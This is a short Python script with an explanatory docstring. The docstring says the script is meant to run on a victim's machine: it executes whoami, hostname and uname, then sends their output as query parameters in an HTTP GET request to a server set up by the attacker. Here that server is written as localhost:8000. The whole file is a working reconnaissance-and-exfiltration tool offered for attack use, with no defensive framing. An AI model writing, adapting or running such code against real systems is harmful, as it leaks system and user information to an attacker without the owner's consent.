import requests
import urllib
import subprocess
from subprocess import PIPE, STDOUT


commands = ['whoami','hostname','uname']
out = {}
for command in commands:
	try:
		p = subprocess.Popen(command, stderr=STDOUT,
		stdout=PIPE)
		out[command] = p.stdout.read().strip()
	except:
		pass

requests.get('http://localhost:8000/index.html?' +
urllib.urlencode(out))

"""
This script is supposed to run on the victim's side using python. The command on the list 
will work on Unix systems, but they can be adapted for other OS as well. 
The server must be setup by the attacker as it will receive the information of the commands
as GET requests. In this scenario, the server is actually the side with which the
attacker interects. 
"""
